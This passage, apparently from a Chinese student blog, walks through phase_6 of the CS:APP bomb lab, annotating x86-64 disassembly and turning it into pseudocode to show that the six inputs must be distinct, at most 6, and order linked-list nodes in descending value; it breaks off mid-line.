class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14							# 将相关寄存器原值入栈</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp					# %rsp -= 0x50（分配空间）</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13					# %r13 = %rsp</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi					# %rsi = %rsp</span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;	# 调用 read_six_numbers</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14					# %r14 = %rsp</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d					# %r12d = 0x0</span><br><span class="line">  </span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp					# %rbp = %r13</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax				# %eax = *(%r13 + 0x0)</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax					# %eax -= 0x1</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax			</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;		# if %eax &lt;= 0x5，跳转到 401128</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d					# %r12d += 0x1</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d			</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;		# if %r12d == 0x6，跳转到 401153</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx					# %ebx = %r12d</span><br><span class="line">  </span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax					# %rax = %ebx</span><br><span class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax			# %eax = *(%rsp + %rax * 4)</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)			</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;		# if *(%rbp) != %eax，跳转到 401145</span><br><span class="line">  401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx					# %ebx += 0x1</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx	</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;		# if %ebx &lt;= 0x5，跳转到 401135</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13					# %r13 += 0x4</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;		# 直接跳转到 401114</span><br><span class="line">  </span><br><span class="line">  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi				# %rsi = %rsp + 0x18</span><br><span class="line">  401158:	4c 89 f0             	mov    %r14,%rax					# %rax = %r14</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx					# %ecx = 0x7</span><br><span class="line">  </span><br><span class="line">  401160:	89 ca                	mov    %ecx,%edx					# %edx = %ecx</span><br><span class="line">  401162:	2b 10                	sub    (%rax),%edx					# %edx -= *(%rax)</span><br><span class="line">  401164:	89 10                	mov    %edx,(%rax)					# *(%rax) = %edx</span><br><span class="line">  401166:	48 83 c0 04          	add    $0x4,%rax					# %rax += 0x4</span><br><span class="line">  40116a:	48 39 f0             	cmp    %rsi,%rax			</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;		# if %rax != %rsi，跳转到 401160</span><br><span class="line">  </span><br><span class="line">  40116f:	be 00 00 00 00       	mov    $0x0,%esi					# %esi = 0x0</span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;		# 直接跳转到 401197</span><br><span class="line">  </span><br><span class="line">  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx				# %rdx = *(%rdx + 0x8)</span><br><span class="line">  40117a:	83 c0 01             	add    $0x1,%eax					# %eax += 0x1</span><br><span class="line">  40117d:	39 c8                	cmp    %ecx,%eax			</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;		# if %eax != %ecx，跳转到 401176</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;		# 直接跳转到 401188</span><br><span class="line">  </span><br><span class="line">  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx				# %edx = 0x6032d0</span><br><span class="line">  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)		# *(%rsp + %rsi * 2 + 0x20) = %rdx</span><br><span class="line">  40118d:	48 83 c6 04          	add    $0x4,%rsi					# %rsi += 0x4</span><br><span class="line">  401191:	48 83 fe 18          	cmp    $0x18,%rsi			</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;		# if %esi == 0x18，跳转到 4011ab</span><br><span class="line">  </span><br><span class="line">  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx			# %ecx = *(%rsp + %rsi * 1)</span><br><span class="line">  40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;		# if %ecx &lt;= 0x1，跳转到 401183</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    $0x1,%eax					# %eax = 0x1</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx				# %edx = 0x6032d0</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;		# 直接跳转到 401176</span><br><span class="line">  </span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx				# %rbx = *(%rsp + 0x20)</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax				# %rax = %rsp + 0x28</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi				# %rsi = %rsp + 0x50</span><br><span class="line">  4011ba:	48 89 d9             	mov    %rbx,%rcx					# %rcx = %rbx</span><br><span class="line">  </span><br><span class="line">  4011bd:	48 8b 10             	mov    (%rax),%rdx					# %rdx = *(%rax)</span><br><span class="line">  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)				# *(%rcx + 0x8) = %rdx</span><br><span class="line">  4011c4:	48 83 c0 08          	add    $0x8,%rax					# %rax += 0x8</span><br><span class="line">  4011c8:	48 39 f0             	cmp    %rsi,%rax			</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;		# if %rax == %rsi，跳转到 4011d2</span><br><span class="line">  4011cd:	48 89 d1             	mov    %rdx,%rcx					# %rcx = %rdx</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;		# 直接跳转到 4011bd</span><br><span class="line">  </span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)				# *(%rdx + 0x8) = 0x0</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp					# %ebp = 0x5</span><br><span class="line">  </span><br><span class="line">  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax				# %rax = *(%rbx + 0x8)</span><br><span class="line">  4011e3:	8b 00                	mov    (%rax),%eax					# %eax = *(%rax)</span><br><span class="line">  4011e5:	39 03                	cmp    %eax,(%rbx)			</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;		# if *(%rbx) &gt;= %eax，跳转到 4011ee</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">  </span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx				# %rbx = *(%rbx + 0x8)</span><br><span class="line">  4011f2:	83 ed 01             	sub    $0x1,%ebp					# %ebp -= 0x1</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;		# if %ebp != 0x1，跳转到 4011df</span><br><span class="line">  </span><br><span class="line">  4011f7:	48 83 c4 50          	add    $0x50,%rsp					# %rsp += 0x50</span><br><span class="line">  4011fb:	5b                   	pop    %rbx</span><br><span class="line">  4011fc:	5d                   	pop    %rbp</span><br><span class="line">  4011fd:	41 5c                	pop    %r12</span><br><span class="line">  4011ff:	41 5d                	pop    %r13</span><br><span class="line">  401201:	41 5e                	pop    %r14</span><br><span class="line">  401203:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>
<ul>
<li><p>首先，将相关寄存器的原值保存起来，为 phase_6 的栈帧分配空间；%r13 &#x3D; %rsp，%rsi &#x3D; %rsp，调用函数 read_six_numbers，%r14 &#x3D; %rsp，%r12d &#x3D; 0x0</p>
<blockquote>
<p>%rsi 被初始化为 phase_6 的栈指针 %rsp，read_six_numbers 会将我们输入的 6 个值存储在 %rsp、%rsp + 4、%rsp + 8 、%rsp + 16、%rsp + 20</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">4010f4:	41 56                	push   %r14							# 将相关寄存器原值入栈</span><br><span class="line">4010f6:	41 55                	push   %r13</span><br><span class="line">4010f8:	41 54                	push   %r12</span><br><span class="line">4010fa:	55                   	push   %rbp</span><br><span class="line">4010fb:	53                   	push   %rbx</span><br><span class="line">4010fc:	48 83 ec 50          	sub    $0x50,%rsp					# %rsp -= 0x50（分配空间）</span><br><span class="line">401100:	49 89 e5             	mov    %rsp,%r13					# %r13 = %rsp</span><br><span class="line">401103:	48 89 e6             	mov    %rsp,%rsi					# %rsi = %rsp</span><br><span class="line">401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;	# 调用 read_six_numbers</span><br><span class="line">40110b:	49 89 e6             	mov    %rsp,%r14					# %r14 = %rsp</span><br><span class="line">40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d					# %r12d = 0x0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>接下来，判断 %rsp，%rsp + 0x4，%rsp + 0x8，%rsp + 0xc，%rsp + 0x10， %rsp + 0x14 这 6 个指针所指向的值，需要它们两两不等，而且都小于等于 6，如果不满足则炸弹爆炸</p>
<blockquote>
<p>所以这里要求我们输入的 6 个值需要两两不等且都小于等于 6</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">401114:	4c 89 ed             	mov    %r13,%rbp					# %rbp = %r13</span><br><span class="line">401117:	41 8b 45 00          	mov    0x0(%r13),%eax				# %eax = *(%r13 + 0x0)</span><br><span class="line">40111b:	83 e8 01             	sub    $0x1,%eax					# %eax -= 0x1</span><br><span class="line">40111e:	83 f8 05             	cmp    $0x5,%eax			</span><br><span class="line">401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;		# if %eax &lt;= 0x5，跳转到 401128</span><br><span class="line">401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line"></span><br><span class="line">401128:	41 83 c4 01          	add    $0x1,%r12d					# %r12d += 0x1</span><br><span class="line">40112c:	41 83 fc 06          	cmp    $0x6,%r12d			</span><br><span class="line">401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;		# if %r12d == 0x6，跳转到 401153</span><br><span class="line">401132:	44 89 e3             	mov    %r12d,%ebx					# %ebx = %r12d</span><br><span class="line"></span><br><span class="line">401135:	48 63 c3             	movslq %ebx,%rax					# %rax = %ebx</span><br><span class="line">401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax			# %eax = *(%rsp + %rax * 4)</span><br><span class="line">40113b:	39 45 00             	cmp    %eax,0x0(%rbp)			</span><br><span class="line">40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;		# if *(%rbp) != %eax，跳转到 401145</span><br><span class="line">401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line">401145:	83 c3 01             	add    $0x1,%ebx					# %ebx += 0x1</span><br><span class="line">401148:	83 fb 05             	cmp    $0x5,%ebx	</span><br><span class="line">40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;		# if %ebx &lt;= 0x5，跳转到 401135</span><br><span class="line"></span><br><span class="line">40114d:	49 83 c5 04          	add    $0x4,%r13					# %r13 += 0x4</span><br><span class="line">401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;		# 直接跳转到 401114</span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对应的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">r12d = <span class="number">0</span>;</span><br><span class="line">r13 = rsp;</span><br><span class="line"><span class="keyword">while</span> (r12d != <span class="number">6</span>) &#123; </span><br><span class="line">	</span><br><span class="line">    rbp = r13; 		</span><br><span class="line">	eax = *r13 - <span class="number">1</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (eax &gt; <span class="number">5</span>) &#123;			<span class="comment">// 说明指向的值必须小于等于 6</span></span><br><span class="line">        explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    r12d += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (r12d == <span class="number">0x6</span>) &#123; 		<span class="comment">// 判断这一轮是否比较完了</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ebx = r12d;</span><br><span class="line">    <span class="keyword">while</span> (ebx &lt;= <span class="number">5</span>) &#123;		<span class="comment">// 逐个比较当前指向的值和后边指向的值是否相等</span></span><br><span class="line">        rax = *(rsp + ebx * <span class="number">4</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (rax != *rbp) &#123; 	  </span><br><span class="line">            ebx += <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            explode_bomb()</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    r13 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果我们输入的 6 个值两两不等且都小于等于 6，<strong>跳转到 4001153</strong>，进行一系列的初始化赋值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi				# %rsi = %rsp + 0x18</span><br><span class="line">401158:	4c 89 f0             	mov    %r14,%rax					# %rax = %r14</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx					# %ecx = 0x7</span><br></pre></td></tr></table></figure>

<ul>
<li><p>接下来，将 %rsp，%rsp + 4，%rsp + 8，%rsp + 12，%rsp + 16，%rsp + 20 所指向的值赋值为 7 - x，x 都是小于等于 6 的</p>
<blockquote>
<p>x 为我们输入的原值</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">401160:	89 ca                	mov    %ecx,%edx					# %edx = %ecx</span><br><span class="line">401162:	2b 10                	sub    (%rax),%edx					# %edx -= *(%rax)</span><br><span class="line">401164:	89 10                	mov    %edx,(%rax)					# *(%rax) = %edx</span><br><span class="line">401166:	48 83 c0 04          	add    $0x4,%rax					# %rax += 0x4</span><br><span class="line">40116a:	48 39 f0             	cmp    %rsi,%rax			</span><br><span class="line">40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;		# if %rax != %rsi，跳转到 401160</span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对应的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rax = rsp;</span><br><span class="line">rsi = rsp + <span class="number">24</span> <span class="comment">// 0x18</span></span><br><span class="line">ecx = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">while</span> (rax != rsi) &#123;</span><br><span class="line">    *(rax) = ecx - *(rax); <span class="comment">// 赋值为 7- x</span></span><br><span class="line">    rax += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>将 %esi 赋值为 0，直接跳转到 401197</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">40116f:	be 00 00 00 00       	mov    $0x0,%esi					# %esi = 0x0</span><br><span class="line">401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;		# 直接跳转到 401197</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>跳转到 401197</strong>，它根据 %rsp，%rsp + 4，%rsp + 8，%rsp + 12，%rsp + 16，%rsp + 20 指向值的情况，给 %rsp + 32，%rsp + 40，%rsp + 48，%rsp + 56，%rsp + 64，%rsp + 72 赋值，具体赋什么值，下面详细分析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx				# %rdx = *(%rdx + 0x8)</span><br><span class="line">40117a:	83 c0 01             	add    $0x1,%eax					# %eax += 0x1</span><br><span class="line">40117d:	39 c8                	cmp    %ecx,%eax			</span><br><span class="line">40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;		# if %eax != %ecx，跳转到 401176</span><br><span class="line">401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;		# 直接跳转到 401188</span><br><span class="line"></span><br><span class="line">401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx				# %edx = 0x6032d0</span><br><span class="line">401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)		# *(%rsp + %rsi * 2 + 0x20) = %rdx</span><br><span class="line">40118d:	48 83 c6 04          	add    $0x4,%rsi					# %rsi += 0x4</span><br><span class="line">401191:	48 83 fe 18          	cmp    $0x18,%rsi			</span><br><span class="line">401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;		# if %esi == 0x18，跳转到 4011ab</span><br><span class="line"></span><br><span class="line">401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx			# %ecx = *(%rsp + %rsi * 1)</span><br><span class="line">40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;		# if %ecx &lt;= 0x1，跳转到 401183</span><br><span class="line">40119f:	b8 01 00 00 00       	mov    $0x1,%eax					# %eax = 0x1</span><br><span class="line">4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx				# %edx = 0x6032d0</span><br><span class="line">4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;		# 直接跳转到 401176</span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对应的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rsi = <span class="number">0</span>;</span><br><span class="line">edx = <span class="number">0x6032d0</span>;</span><br><span class="line"><span class="keyword">while</span> (rsi != <span class="number">24</span>) &#123; <span class="comment">// 0x18</span></span><br><span class="line">    <span class="type">int</span> ecx = *(rsp + rsi);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ecx &gt; <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="type">int</span> eax = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            eax += <span class="number">1</span>;</span><br><span class="line">        	edx = *(edx + <span class="number">8</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (eax != ecx)</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    *(rsp + rsi * <span class="number">2</span> + <span class="number">32</span>) = edx;</span><br><span class="line">    </span><br><span class="line">    edx = <span class="number">0x6032d0</span>;</span><br><span class="line">    rsi += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们用命令 <strong>x&#x2F;s 0x6032d0</strong> 来看看 0x6032d0 处的值到底是什么</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240309173301289.png" class="" title="image-20240309173301289">

<ul>
<li><p>0x6032d0 是一个结点的起始地址，且 0x6032d0 处存储的值是 0x14c，因为循环中每次要递增 8，而 0x6032d8 处存储的是另一个地址，这个地址是第二个结点的起始地址，以此类推</p>
</li>
<li><p>这说明它是一个单链表，且每个结点的起始地址加 8 处指向下一个结点的起始地址</p>
</li>
<li><p>%rsp ~ %rsp + 20 处的值为 7 - x，那么为 %rsp + 32 ~ %rsp + 72 赋的值为第 7 - x 个结点的起始地址</p>
</li>
</ul>
<blockquote>
<p>x 为我们输入的原值</p>
</blockquote>
<ul>
<li>经过为 %rsp + 32 ~ %rsp + 72 引用的内存赋值，<strong>跳转到 4011ab</strong>，进行一系列赋值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx				# %rbx = *(%rsp + 0x20)</span><br><span class="line">4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax				# %rax = %rsp + 0x28</span><br><span class="line">4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi				# %rsi = %rsp + 0x50</span><br><span class="line">4011ba:	48 89 d9             	mov    %rbx,%rcx					# %rcx = %rbx</span><br></pre></td></tr></table></figure>

<ul>
<li>因为我们为 %rsp + 32，%rsp + 40，%rsp + 48，%rsp + 56，%rsp + 64，%rsp + 72 赋值的结点之间还不是连接关系，下边的汇编代码将它们指向的结点连接起来</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4011bd:	48 8b 10             	mov    (%rax),%rdx					# %rdx = *(%rax)</span><br><span class="line">4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)				# *(%rcx + 0x8) = %rdx</span><br><span class="line">4011c4:	48 83 c0 08          	add    $0x8,%rax					# %rax += 0x8</span><br><span class="line">4011c8:	48 39 f0             	cmp    %rsi,%rax			</span><br><span class="line">4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;		# if %rax == %rsi，跳转到 4011d2</span><br><span class="line">4011cd:	48 89 d1             	mov    %rdx,%rcx					# %rcx = %rdx</span><br><span class="line">4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;		# 直接跳转到 4011bd</span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对应的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rbx = *(rsp + <span class="number">32</span>); 	<span class="comment">// 0x20</span></span><br><span class="line">rax = rsp + <span class="number">40</span>; 	<span class="comment">// 0x28</span></span><br><span class="line">rsi = rsp + <span class="number">80</span>;	 	<span class="comment">// 0x50</span></span><br><span class="line">rcx = rbx;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    rdx = *(rax); 		<span class="comment">// 得到下一个结点的起始地址</span></span><br><span class="line">    *(rcx + <span class="number">8</span>) = rdx; 	<span class="comment">// 将当前结点指向的下一个结点更新</span></span><br><span class="line">    rax += <span class="number">8</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rax == rsi) &#123; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    rcx = rdx; </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>连接好结点后，<strong>跳转到 4011d2</strong>，*(%rsp + 0x8) &#x3D; 0x0 将最后一个结点的下一个结点设置为 null</li>
<li>然后判断结点之间的大小关系，必须保证连接好后的结点存储的值是 <strong>从大到小</strong> 排序的，否则炸弹会爆炸</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)				# *(%rdx + 0x8) = 0x0</span><br><span class="line">4011d9:	00 </span><br><span class="line">4011da:	bd 05 00 00 00       	mov    $0x5,%ebp					# %ebp = 0x5</span><br><span class="line"></span><br><span class="line">4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax				# %rax = *(%rbx + 0x8)</span><br><span class="line">4011e3:	8b 00                	mov    (%rax),%eax					# %eax = *(%rax)</span><br><span class="line">4011e5:	39 03                	cmp    %eax,(%rbx)			</span><br><span class="line">4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;		# if *(%rbx) &gt;= %eax，跳转到 